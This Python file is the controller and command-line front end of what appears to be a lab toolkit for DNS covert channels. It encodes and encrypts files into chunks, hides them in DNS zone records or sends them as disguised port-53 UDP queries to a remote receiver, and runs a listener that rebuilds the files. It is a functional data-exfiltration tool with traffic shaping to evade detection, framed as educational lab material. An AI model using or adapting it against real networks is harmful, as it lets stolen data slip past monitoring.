"""
Controller / CLI / Orchestrator
Single entrypoint, job scheduler and scenario manager
"""

import json
import logging
import subprocess
import shutil
import socket
import time
from pathlib import Path
from typing import Dict, Any
from datetime import datetime
import typer
import sys

from .scenario_manager import ScenarioManager
from .covert_channel import CovertChannelDesigner
from .encoder_decoder import EncoderDecoder
from .zone_manager import ZoneManager
from .traffic_shaper import TrafficShaper

CONFIG_DIR = Path("./config")

def show_disclaimer():
    typer.echo("Disclaimer: This tool is for educational purposes only. Use responsibly.")
    if not typer.confirm("Do you accept the disclaimer?"):
        sys.exit(1)

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = typer.Typer()

class Controller:
    """Main controller orchestrating all toolkit components"""
    
    def __init__(self, mock_keys: bool = False):
        self.scenario_manager = ScenarioManager()
        self.channel_designer = CovertChannelDesigner()
        self.encoder_decoder = EncoderDecoder()
        self.zone_manager = ZoneManager(mock_keys=mock_keys)
        self.traffic_shaper = TrafficShaper()
        self.state_file = Path("active_scenarios.json")
        self.active_scenarios: Dict[str, Dict[str, Any]] = self._load_state()
    
    def _load_state(self) -> Dict[str, Dict[str, Any]]:
        """Load active scenarios state from disk"""
        if self.state_file.exists():
            try:
                with open(self.state_file, 'r') as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError):
                logging.warning("Failed to load state file, starting with empty state")
        return {}
    
    def _save_state(self):
        """Save active scenarios state to disk"""
        try:
            with open(self.state_file, 'w') as f:
                json.dump(self.active_scenarios, f, indent=2)
        except IOError as e:
            logging.error(f"Failed to save state: {e}")

    def _check_docker_available(self) -> bool:
        """Check if Docker is available on the system"""
        return shutil.which("docker") is not None and shutil.which("docker-compose") is not None
    
    def init_lab(self, mode: str = "docker") -> Dict[str, Any]:
        """Initialize the lab environment"""
        result = {
            "timestamp": datetime.now().isoformat(),
            "event": "lab_init",
            "mode": mode,
            "status": "success"
        }
        
        try:
            if mode == "docker":
                if not self._check_docker_available():
                    raise RuntimeError(
                        "Docker and docker-compose are required but not found. "
                        "Please install Docker Desktop or Docker Engine + Docker Compose.\n"
                        "Visit: https://docs.docker.com/get-docker/"
                    )
                
                # Check if Docker daemon is running
                try:
                    subprocess.run(["docker", "info"], 
                                 capture_output=True, check=True, timeout=10)
                except subprocess.CalledProcessError:
                    raise RuntimeError(
                        "Docker is installed but the Docker daemon is not running. "
                        "Please start Docker Desktop or the Docker service."
                    )
                
                # Initialize Docker environment
                docker_dir = Path("docker")
                if not docker_dir.exists():
                    raise RuntimeError(f"Docker configuration directory '{docker_dir}' not found")
                
                # Build and start containers
                subprocess.run(["docker-compose", "up", "-d", "--build"], 
                             cwd=docker_dir, check=True)
                
                logging.info("Docker lab environment initialized successfully")
                result["message"] = "Docker lab environment ready"
                
            elif mode == "local":
                # Local mode - just verify dependencies
                logging.info("Initializing local lab environment")
                result["message"] = "Local lab environment ready"
                
            else:
                raise ValueError(f"Unknown lab mode: {mode}")
                
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            logging.error(f"Lab initialization failed: {e}")
            
        return result
        
    def start_scenario(self, scenario_name: str):
        """Start a covert channel scenario"""
        scenario_config = self.scenario_manager.get_scenario(scenario_name)
        
        if not scenario_config:
            raise ValueError(f"Scenario '{scenario_name}' not found")
        
        # Initialize channel designer with scenario parameters
        channel_config = self.channel_designer.configure_channel(
            carrier=scenario_config['carrier'],
            domain=scenario_config['domain'],
            ttl=scenario_config['ttl'],
            chunk_size=scenario_config['chunk_size']
        )
        
        # Initialize zone manager
        self.zone_manager.initialize_zone(
            domain=scenario_config['domain'],
            ttl=scenario_config['ttl']
        )
        
        # Configure traffic shaping
        self.traffic_shaper.configure(
            frequency=scenario_config['frequency'],
            domain=scenario_config['domain']
        )
        
        self.active_scenarios[scenario_name] = {
            'config': scenario_config,
            'channel_config': channel_config,
            'status': 'running',
            'started_at': datetime.now().isoformat()
        }
        
        self._save_state()
        
        logging.info(f"Scenario '{scenario_name}' started successfully")
        
    def push_file(self, file_path: Path, scenario_name: str):
        """Push a file through the covert channel"""
        if scenario_name not in self.active_scenarios:
            raise ValueError(f"Scenario '{scenario_name}' is not running")
        
        scenario = self.active_scenarios[scenario_name]
        config = scenario['config']
        
        self.traffic_shaper.configure(
            frequency=config['frequency'],
            domain=config['domain']
        )
        
        zone_file = Path(f"/etc/bind/zones/{config['domain']}.zone")
        if zone_file.exists():
            # Read the original zone content (everything before DNSKEY records)
            with open(zone_file, 'r') as f:
                lines = f.readlines()
            
            # Keep only the original zone structure, remove DNSKEY records
            original_lines = []
            for line in lines:
                if 'DNSKEY' not in line or 'sequence=' not in line:
                    original_lines.append(line)
            
            # Rewrite the zone file with original content only
            with open(zone_file, 'w') as f:
                f.writelines(original_lines)
        
        # Read file content
        with open(file_path, 'rb') as f:
            payload = f.read()
        
        # Encode payload
        encoded_chunks = self.encoder_decoder.encode(
            payload=payload,
            chunk_size=config['chunk_size'],
            encryption=config['encryption']
        )
        
        # Publish chunks through zone manager with traffic shaping
        for i, chunk in enumerate(encoded_chunks):
            self.zone_manager.publish_chunk(
                domain=config['domain'],
                chunk=chunk,
                sequence=i
            )
            
            # Apply traffic shaping delay
            self.traffic_shaper.apply_delay()
            
            logging.info(f"Published chunk {i+1}/{len(encoded_chunks)} for {file_path}")
        
        logging.info(f"File '{file_path}' successfully transmitted through scenario '{scenario_name}'")

    def pull_file(self, output_path: Path, scenario_name: str):
        """Pull data from the covert channel and reconstruct file"""
        if scenario_name not in self.active_scenarios:
            raise ValueError(f"Scenario '{scenario_name}' is not running")
        
        scenario = self.active_scenarios[scenario_name]
        config = scenario['config']
        
        # Extract chunks from zone
        chunks = self.zone_manager.extract_chunks(config['domain'])
        
        if not chunks:
            raise ValueError(f"No data found in covert channel for domain {config['domain']}")
        
        logging.info(f"Extracted {len(chunks)} chunks from covert channel")
        
        # Decode chunks back to original payload
        payload = self.encoder_decoder.decode(
            encoded_chunks=chunks,
            encryption=config['encryption']
        )
        
        # Write reconstructed file
        with open(output_path, 'wb') as f:
            f.write(payload)
        
        logging.info(f"File reconstructed and saved to '{output_path}' ({len(payload)} bytes)")
        
    def stop_scenario(self, scenario_name: str):
        """Stop a running scenario"""
        if scenario_name not in self.active_scenarios:
            raise ValueError(f"Scenario '{scenario_name}' is not running")
        
        # Clean up zone
        scenario = self.active_scenarios[scenario_name]
        self.zone_manager.cleanup_zone(scenario['config']['domain'])
        
        # Update scenario status
        self.active_scenarios[scenario_name]['status'] = 'stopped'
        self.active_scenarios[scenario_name]['stopped_at'] = datetime.now().isoformat()
        
        self._save_state()
        
        logging.info(f"Scenario '{scenario_name}' stopped successfully")
        
    def get_scenario_status(self, scenario_name: str) -> Dict[str, Any]:
        """Get status of a scenario"""
        return self.active_scenarios.get(scenario_name, {})
    
    def push_file_to_remote(self, file_path: Path, scenario_name: str, lan_config: Dict[str, Any]):
        """Push a file through the covert channel to a remote receiver on LAN"""
        if scenario_name not in self.active_scenarios:
            # Try to start the scenario if it exists
            scenario_config = self.scenario_manager.get_scenario(scenario_name)
            if scenario_config:
                self.start_scenario(scenario_name)
            else:
                raise ValueError(f"Scenario '{scenario_name}' not found")
        
        scenario = self.active_scenarios[scenario_name]
        config = scenario['config']
        
        receiver_ip = lan_config.get('receiver_ip')
        dns_server = lan_config.get('dns_server', receiver_ip)
        port = lan_config.get('port', 53)
        
        logging.info(f"Pushing file to remote receiver at {receiver_ip}:{port}")
        
        # Configure traffic shaper for remote transmission
        self.traffic_shaper.configure(
            frequency=config['frequency'],
            domain=config['domain']
        )
        
        # Read file content
        with open(file_path, 'rb') as f:
            payload = f.read()
        
        logging.info(f"File size: {len(payload)} bytes")
        
        # Encode payload
        encoded_chunks = self.encoder_decoder.encode(
            payload=payload,
            chunk_size=config['chunk_size'],
            encryption=config['encryption']
        )
        
        logging.info(f"Encoded into {len(encoded_chunks)} chunks")
        
        # Send chunks to remote receiver via DNS queries
        successful_chunks = 0
        failed_chunks = 0
        
        for i, chunk in enumerate(encoded_chunks):
            try:
                # Create DNS query with embedded covert data
                self._send_covert_dns_query(
                    receiver_ip=receiver_ip,
                    port=port,
                    domain=config['domain'],
                    chunk=chunk,
                    sequence=i
                )
                
                successful_chunks += 1
                
                # Apply traffic shaping delay
                self.traffic_shaper.apply_delay()
                
                if (i + 1) % 10 == 0:
                    logging.info(f"Transmitted {i+1}/{len(encoded_chunks)} chunks")
                    
            except Exception as e:
                logging.error(f"Failed to send chunk {i}: {e}")
                failed_chunks += 1
        
        # Send END_OF_TRANSMISSION signal
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            end_message = f"END_OF_TRANSMISSION:{len(encoded_chunks)}".encode('utf-8')
            sock.sendto(end_message, (receiver_ip, port))
            sock.close()
            logging.info("Sent END_OF_TRANSMISSION signal")
        except Exception as e:
            logging.warning(f"Failed to send END_OF_TRANSMISSION: {e}")
        
        logging.info(f"Transmission complete: {successful_chunks} successful, {failed_chunks} failed")
        
        if failed_chunks > 0:
            logging.warning(f"{failed_chunks} chunks failed to transmit")
    
    def _send_covert_dns_query(self, receiver_ip: str, port: int, domain: str, 
                                chunk: str, sequence: int):
        """Send a DNS query containing covert channel data
        
        Args:
            receiver_ip: IP address of the receiver
            port: Port number to send to
            domain: Domain name for the covert channel
            chunk: Base64-encoded chunk data (string)
            sequence: Sequence number of this chunk
        """
        
        try:
            # Create a UDP socket for DNS query
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            
            # chunk is already Base64-encoded string from encoder_decoder.encode()
            # Format: COVERT_QUERY:<sequence>:<base64_data>
            query_string = f"COVERT_QUERY:{sequence}:{chunk}"
            query_data = query_string.encode('utf-8')
            
            # Send to receiver
            sock.sendto(query_data, (receiver_ip, port))
            
            # Wait for response (optional)
            try:
                response, _ = sock.recvfrom(1024)
                logging.debug(f"Received response for chunk {sequence}")
            except socket.timeout:
                logging.debug(f"No response for chunk {sequence} (this is normal)")
            
            sock.close()
            
        except Exception as e:
            logging.error(f"Error sending DNS query: {e}")
            raise
    
    def start_receiver(self, scenario_name: str, output_dir: str, lan_config: Dict[str, Any]):
        """Start receiver daemon to listen for incoming covert channel data"""
        scenario_config = self.scenario_manager.get_scenario(scenario_name)
        
        if not scenario_config:
            raise ValueError(f"Scenario '{scenario_name}' not found")
        
        sender_ip = lan_config.get('sender_ip')
        listen_port = lan_config.get('listen_port', 53)
        
        logging.info(f"Starting receiver on port {listen_port}")
        logging.info(f"Expecting data from sender: {sender_ip}")
        logging.info(f"Output directory: {output_dir}")
        
        # Create output directory
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        # Create UDP socket to listen for DNS queries
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            sock.bind(('0.0.0.0', listen_port))
            logging.info(f"Listening on 0.0.0.0:{listen_port}")
        except OSError as e:
            if e.errno == 48 or e.errno == 98:  # Address already in use
                logging.error(f"Port {listen_port} is already in use. Try a different port or stop the conflicting service.")
                raise RuntimeError(f"Port {listen_port} already in use")
            raise
        
        received_chunks = {}  # {sequence: base64_string}
        start_time = time.time()
        last_chunk_time = start_time
        timeout = 60  # 10 seconds timeout after last chunk
        expected_chunks = None  # Will be set by END_OF_TRANSMISSION
        transmission_complete = False
        
        try:
            while True:
                sock.settimeout(5)  # Check timeout every 5 seconds
                
                try:
                    data, addr = sock.recvfrom(4096)
                    
                    # Only accept data from expected sender
                    if sender_ip and addr[0] != sender_ip:
                        logging.debug(f"Ignoring data from unexpected sender: {addr[0]}")
                        continue
                    
                    # Parse covert data from DNS query
                    try:
                        decoded_data = data.decode('utf-8')
                        
                        # Check for END_OF_TRANSMISSION signal
                        if decoded_data.startswith('END_OF_TRANSMISSION:'):
                            expected_chunks = int(decoded_data.split(':')[1])
                            transmission_complete = True
                            logging.info(f"Received END_OF_TRANSMISSION signal. Expected {expected_chunks} chunks.")
                            sock.sendto(b"ACK_END", addr)
                            break
                        
                        # Parse regular chunk data
                        if decoded_data.startswith('COVERT_QUERY:'):
                            parts = decoded_data.split(':', 2)
                            sequence = int(parts[1])
                            chunk_data = parts[2]  # This is Base64 string
                            
                            # Store the Base64 string directly (don't decode to bytes)
                            received_chunks[sequence] = chunk_data
                            last_chunk_time = time.time()
                            
                            logging.info(f"Received chunk {sequence} from {addr[0]} ({len(chunk_data)} chars)")
                            
                            # Send acknowledgment
                            sock.sendto(b"ACK", addr)
                            
                    except Exception as e:
                        logging.debug(f"Failed to parse data: {e}")
                        continue
                        
                except socket.timeout:
                    # Check if we should stop waiting
                    if received_chunks and (time.time() - last_chunk_time) > timeout:
                        logging.info(f"Timeout: No new chunks received for {timeout} seconds")
                        break
                    if received_chunks:
                        logging.info(f"Waiting for more chunks... (received {len(received_chunks)} so far)")
                    continue
                    
        except KeyboardInterrupt:
            logging.info("Receiver stopped by user")
        finally:
            sock.close()
        
        # Reconstruct file from received chunks
        if received_chunks:
            logging.info(f"Received {len(received_chunks)} chunks total")
            
            if expected_chunks is not None and len(received_chunks) != expected_chunks:
                logging.warning(f"Expected {expected_chunks} chunks but received {len(received_chunks)}")
            
            # Sort chunks by sequence number
            sorted_chunks = [received_chunks[i] for i in sorted(received_chunks.keys())]
            
            # Decode chunks back to original payload
            try:
                logging.info("Decoding received chunks...")
                payload = self.encoder_decoder.decode(
                    encoded_chunks=sorted_chunks,  # List[str] of Base64 strings
                    encryption=scenario_config['encryption']
                )
                
                # Save reconstructed file
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                output_file = Path(output_dir) / f"received_{timestamp}.bin"
                with open(output_file, 'wb') as f:
                    f.write(payload)
                
                logging.info(f"File reconstructed and saved to '{output_file}' ({len(payload)} bytes)")
                print(f"\nFile successfully received and saved to: {output_file}")
                print(f"File size: {len(payload)} bytes")
                print(f"Chunks received: {len(received_chunks)}")
                
            except Exception as e:
                logging.error(f"Failed to decode received data: {e}")
                # Save raw chunks for debugging
                debug_file = Path(output_dir) / f"debug_chunks_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(debug_file, 'w') as f:
                    json.dump({
                        'chunk_count': len(received_chunks),
                        'sequences': list(received_chunks.keys())
                    }, f, indent=2)
                logging.info(f"Debug information saved to '{debug_file}'")
                print(f"\nFailed to decode data. Debug info saved to: {debug_file}")
                raise
        else:
            logging.warning("No chunks received")
            print("\nNo data received")
